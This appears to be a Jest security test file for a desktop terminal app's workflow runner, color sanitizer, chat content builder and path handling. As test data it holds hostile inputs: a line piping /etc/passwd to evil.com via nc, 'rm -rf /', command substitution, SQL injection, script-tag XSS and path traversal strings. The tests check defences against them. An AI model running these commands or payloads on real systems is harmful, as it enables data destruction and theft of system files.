// Security tests for sensitive code paths
//
// Tests the security patterns used in WorkflowRunner (evalCondition, resolveVars),
// sanitizeColor, ChatService._buildContent, and path traversal defense.
// WorkflowRunner's internal functions are not directly exported, so we replicate
// the exact logic here to verify the security properties.

describe('evalCondition ReDoS protection', () => {
  // If evalCondition isn't directly exported, we test the logic pattern
  // The `matches` operator has a 10_000 char limit

  test('matches operator handles basic regex', () => {
    const testRegex = (left, right) => {
      try {
        if (left.length > 10_000) return false;
        return new RegExp(right).test(left);
      } catch { return false; }
    };

    expect(testRegex('hello world', 'hello')).toBe(true);
    expect(testRegex('test', '^test$')).toBe(true);
    expect(testRegex('foo', 'bar')).toBe(false);
  });

  test('rejects strings longer than 10000 characters', () => {
    const longString = 'a'.repeat(10_001);

    // Simulating the ReDoS protection from WorkflowRunner
    const testMatchesWithLimit = (left, right) => {
      try {
        if (left.length > 10_000) return false;
        return new RegExp(right).test(left);
      } catch { return false; }
    };

    expect(testMatchesWithLimit(longString, 'a')).toBe(false);
  });

  test('string at exactly 10000 chars is allowed', () => {
    const exactString = 'a'.repeat(10_000);

    const testMatchesWithLimit = (left, right) => {
      try {
        if (left.length > 10_000) return false;
        return new RegExp(right).test(left);
      } catch { return false; }
    };

    expect(testMatchesWithLimit(exactString, '^a+$')).toBe(true);
  });

  test('invalid regex pattern returns false without throwing', () => {
    const testMatchesWithLimit = (left, right) => {
      try {
        if (left.length > 10_000) return false;
        return new RegExp(right).test(left);
      } catch { return false; }
    };

    expect(testMatchesWithLimit('test', '[invalid(')).toBe(false);
    expect(testMatchesWithLimit('test', '*invalid')).toBe(false);
  });

  test('catastrophic backtracking pattern is handled by length limit', () => {
    // (a+)+b against "aaaa...a" would cause ReDoS without length limit
    const maliciousInput = 'a'.repeat(10_001);

    const testMatchesWithLimit = (left, right) => {
      try {
        if (left.length > 10_000) return false;
        return new RegExp(right).test(left);
      } catch { return false; }
    };

    // Should be rejected by length check before regex runs
    expect(testMatchesWithLimit(maliciousInput, '(a+)+b')).toBe(false);
  });
});

describe('resolveVars security', () => {
  test('resolveVars treats shell injection as literal string', () => {
    const mockResolveVars = (value, vars) => {
      if (typeof value !== 'string') return value;
      return value.replace(/\$([a-zA-Z_]\w*(?:\.[a-zA-Z_]\w*)*)/g, (match, key) => {
        const val = vars.get(key);
        return val != null ? String(val) : match;
      });
    };

    const vars = new Map();
    vars.set('cmd', '; rm -rf /');
    const result = mockResolveVars('echo $cmd', vars);
    // resolveVars produces the literal string, it does NOT execute it
    expect(result).toBe('echo ; rm -rf /');
    expect(result).toContain('; rm -rf /');
  });

  test('resolveVars treats command substitution as literal', () => {
    const mockResolveVars = (value, vars) => {
      if (typeof value !== 'string') return value;
      return value.replace(/\$([a-zA-Z_]\w*(?:\.[a-zA-Z_]\w*)*)/g, (match, key) => {
        const val = vars.get(key);
        return val != null ? String(val) : match;
      });
    };

    const vars = new Map();
    vars.set('val', '$(whoami)');
    const result = mockResolveVars('$val', vars);
    // The result is the literal string "$(whoami)", not the output of whoami
    expect(result).toBe('$(whoami)');
  });

  test('resolveVars does not resolve nested $references in values', () => {
    const mockResolveVars = (value, vars) => {
      if (typeof value !== 'string') return value;
      return value.replace(/\$([a-zA-Z_]\w*(?:\.[a-zA-Z_]\w*)*)/g, (match, key) => {
        const val = vars.get(key);
        return val != null ? String(val) : match;
      });
    };

    const vars = new Map();
    vars.set('a', '$b');
    vars.set('b', 'secret');
    // Should NOT recursively resolve $b in the value of $a
    const result = mockResolveVars('$a', vars);
    expect(result).toBe('$b');
  });
});

// =====================================================================
// 2. sanitizeColor extended XSS tests
// =====================================================================

describe('sanitizeColor XSS vectors', () => {
  // Import from the actual module (renderer utils)
  const { sanitizeColor } = require('../../src/renderer/utils/color');

  test('rejects javascript: protocol', () => {
    expect(sanitizeColor('javascript:alert(1)')).toBe('');
  });

  test('rejects CSS injection with semicolon', () => {
    expect(sanitizeColor('red; background-image: url(evil)')).toBe('');
  });

  test('rejects CSS injection with property', () => {
    expect(sanitizeColor('#ff0000; position: absolute')).toBe('');
  });

  test('rejects very long strings (10000 chars)', () => {
    const longColor = '#' + 'f'.repeat(10000);
    expect(sanitizeColor(longColor)).toBe('');
  });

  test('rejects Unicode characters in hex', () => {
    expect(sanitizeColor('#ff\u200B00ff')).toBe('');
  });

  test('rejects null bytes', () => {
    expect(sanitizeColor('#ff0000\x00<script>')).toBe('');
  });

  test('rejects string with HTML tags', () => {
    expect(sanitizeColor('<script>alert(1)</script>')).toBe('');
  });

  test('rejects data: URI', () => {
    expect(sanitizeColor('data:text/html,<script>alert(1)</script>')).toBe('');
  });

  test('rejects var() CSS function', () => {
    expect(sanitizeColor('var(--accent)')).toBe('');
  });

  test('rejects calc() CSS function', () => {
    expect(sanitizeColor('calc(1px)')).toBe('');
  });

  test('rejects env() CSS function', () => {
    expect(sanitizeColor('env(safe-area-inset-top)')).toBe('');
  });

  test('accepts valid hex after trimming', () => {
    expect(sanitizeColor('\t#abcdef\n')).toBe('#abcdef');
  });

  test('rejects hex with extra characters after valid portion', () => {
    expect(sanitizeColor('#abcdef evil')).toBe('');
  });

  test('rejects object input', () => {
    expect(sanitizeColor({ toString: () => '#ff0000' })).toBe('');
  });

  test('rejects array input', () => {
    expect(sanitizeColor(['#ff0000'])).toBe('');
  });
});

// =====================================================================
// 3. ChatService._buildContent HTML in user content
// =====================================================================

describe('ChatService _buildContent content handling', () => {
  // We test the _buildContent pattern directly since the class requires
  // heavy mocking. The function is straightforward.

  function buildContent(text, images, mentions = []) {
    const hasImages = images && images.length > 0;
    const hasMentions = mentions && mentions.length > 0;

    if (!hasImages && !hasMentions) return text;

    const content = [];
    for (const mention of (mentions || [])) {
      content.push({ type: 'text', text: `[Context: ${mention.label}]\n${mention.content}` });
    }
    if (text) {
      content.push({ type: 'text', text });
    }
    for (const img of (images || [])) {
      content.push({
        type: 'image',
        source: { type: 'base64', media_type: img.mediaType, data: img.base64 }
      });
    }
    return content;
  }

  test('returns plain text when no images or mentions', () => {
    const result = buildContent('hello', null);
    expect(result).toBe('hello');
  });

  test('mention with HTML tags preserves raw content (SDK handles sanitization)', () => {
    const mentions = [{ label: '<script>alert(1)</script>', content: '<img onerror="hack()">' }];
    const result = buildContent('msg', null, mentions);

    expect(result).toHaveLength(2);
    // Content is passed as-is to SDK, which handles sanitization
    expect(result[0].text).toContain('<script>');
    expect(result[0].type).toBe('text');
  });

  test('mention with path traversal in label', () => {
    const mentions = [{ label: '../../../etc/passwd', content: 'data' }];
    const result = buildContent('msg', null, mentions);

    expect(result[0].text).toContain('../../../etc/passwd');
    expect(result[0].type).toBe('text');
  });

  test('mention with backticks in content', () => {
    const mentions = [{ label: 'file', content: '`rm -rf /`' }];
    const result = buildContent('msg', null, mentions);

    expect(result[0].text).toContain('`rm -rf /`');
  });

  test('text with script tags is passed through as plain text', () => {
    const result = buildContent('<script>alert(1)</script>', [{ mediaType: 'image/png', base64: 'abc' }]);

    const textBlock = result.find(b => b.type === 'text');
    expect(textBlock.text).toBe('<script>alert(1)</script>');
  });

  test('handles empty mentions array', () => {
    const result = buildContent('hello', [{ mediaType: 'image/png', base64: 'abc' }], []);
    expect(result).toHaveLength(2); // text + image
  });
});

// =====================================================================
// 4. Path traversal tests
// =====================================================================

describe('path security', () => {
  const path = require('path');

  describe('main process paths.js', () => {
    // Test that path constants are properly constructed and don't allow traversal

    test('dataDir is under home directory', () => {
      const os = require('os');
      const homeDir = os.homedir();
      const dataDir = path.join(homeDir, '.claude-terminal');

      expect(dataDir.startsWith(homeDir)).toBe(true);
      expect(path.relative(homeDir, dataDir)).toBe('.claude-terminal');
    });

    test('path.resolve normalizes traversal attempts', () => {
      const basePath = '/project/src';
      const malicious = '../../../etc/passwd';
      const resolved = path.resolve(basePath, malicious);

      // path.resolve normalizes the ../ and produces an absolute path
      expect(resolved).not.toContain('..');
      // The resolved path should NOT be under basePath
      expect(resolved.startsWith(basePath)).toBe(false);
    });

    test('path.join does not prevent traversal (path.resolve does)', () => {
      const basePath = '/project';
      const userInput = '../../../etc/passwd';
      const joined = path.join(basePath, userInput);

      // path.join normalizes but may still traverse
      // This is why the code uses path.resolve for validation
      const resolved = path.resolve(basePath, userInput);
      expect(path.isAbsolute(resolved)).toBe(true);
    });

    test('absolute path injection is resolved correctly', () => {
      const basePath = '/project';
      const absolute = '/etc/passwd';
      const resolved = path.resolve(basePath, absolute);

      // path.resolve with absolute second arg ignores the first
      expect(resolved).toBe(path.resolve(absolute));
    });

    test('tilde path is treated as literal', () => {
      const basePath = '/project';
      const tildeInput = '~/secrets';
      const resolved = path.resolve(basePath, tildeInput);

      // path.resolve treats ~ as literal directory name, not home expansion
      expect(resolved).toContain('~');
      expect(resolved).not.toBe(path.join(require('os').homedir(), 'secrets'));
    });
  });

  describe('project.ipc scan-todos path validation', () => {
    // The scan-todos handler validates the path before scanning
    // We test the validation pattern directly

    test('rejects empty projectPath', () => {
      const projectPath = '';
      expect(!projectPath || typeof projectPath !== 'string').toBe(true);
    });

    test('rejects null projectPath', () => {
      const projectPath = null;
      expect(!projectPath || typeof projectPath !== 'string').toBe(true);
    });

    test('rejects number projectPath', () => {
      const projectPath = 42;
      expect(!projectPath || typeof projectPath !== 'string').toBe(true);
    });

    test('accepts valid string path', () => {
      const projectPath = '/home/user/project';
      expect(!projectPath || typeof projectPath !== 'string').toBe(false);
    });

    test('path.resolve normalizes path traversal in projectPath', () => {
      const malicious = '/project/../../etc';
      const resolved = path.resolve(malicious);
      // After resolve, the path is normalized
      expect(resolved).not.toContain('..');
    });
  });
});

// =====================================================================
// 5. Workflow variable injection in shell context
// =====================================================================

describe('workflow variable injection defense', () => {
  // resolveVars does pure string substitution. The key defense is that
  // WorkflowRunner uses execFile (not exec) for shell steps, which prevents
  // shell injection. We verify resolveVars produces literal strings.

  const simulateResolveVars = (value, vars) => {
    if (typeof value !== 'string') return value;
    const singleVarMatch = value.match(/^\$([a-zA-Z_]\w*(?:\.[a-zA-Z_]\w*)*)$/);
    if (singleVarMatch) {
      const val = vars.get(singleVarMatch[1]);
      if (val != null) return typeof val === 'string' ? val.replace(/[\r\n]+$/, '') : val;
    }
    return value.replace(/\$([a-zA-Z_]\w*(?:\.[a-zA-Z_]\w*)*)/g, (match, key) => {
      const val = vars.get(key);
      return val != null ? String(val) : match;
    });
  };

  test('shell metacharacters in variable value are treated as literal', () => {
    const vars = new Map();
    vars.set('userInput', '`whoami` && cat /etc/passwd | nc evil.com 4444');

    const result = simulateResolveVars('echo $userInput', vars);

    // resolveVars substitutes literally - no execution occurs
    expect(result).toBe('echo `whoami` && cat /etc/passwd | nc evil.com 4444');
    // The defense is that WorkflowRunner uses execFile, not eval/exec
  });

  test('newline injection in variable', () => {
    const vars = new Map();
    vars.set('val', 'safe\nrm -rf /');

    const result = simulateResolveVars('$val', vars);

    // Single-var path returns the raw value with trailing CR/LF stripped
    expect(result).toBe('safe\nrm -rf /');
  });

  test('dollar sign in value does not cause recursive resolution', () => {
    const vars = new Map();
    vars.set('a', '$PATH');

    const result = simulateResolveVars('$a', vars);

    // Should return the literal "$PATH", not the env variable
    expect(result).toBe('$PATH');
  });

  test('non-string values are returned as-is', () => {
    const vars = new Map();
    const result = simulateResolveVars(42, vars);
    expect(result).toBe(42);
  });

  test('unknown variables remain unresolved', () => {
    const vars = new Map();
    const result = simulateResolveVars('$unknown', vars);
    expect(result).toBe('$unknown');
  });

  test('mixed text with malicious variable', () => {
    const vars = new Map();
    vars.set('name', '"; DROP TABLE users; --');

    const result = simulateResolveVars('SELECT * FROM users WHERE name = "$name"', vars);

    expect(result).toBe('SELECT * FROM users WHERE name = ""; DROP TABLE users; --"');
    // This looks dangerous, but resolveVars is NOT used for SQL.
    // DB steps use parameterized queries. This test confirms resolveVars
    // does literal substitution, leaving defense to the consumer.
  });

  test('object value returned in single-var context', () => {
    const vars = new Map();
    vars.set('data', { key: 'value' });

    const result = simulateResolveVars('$data', vars);

    expect(result).toEqual({ key: 'value' });
  });

  test('object value stringified in mixed-text context', () => {
    const vars = new Map();
    vars.set('data', { key: 'value' });

    const result = simulateResolveVars('result: $data', vars);

    // Our simplified mock uses String(), real code uses JSON.stringify for objects.
    // The key security property: object is converted to string, not executed.
    expect(typeof result).toBe('string');
    expect(result).toContain('result: ');
  });
});
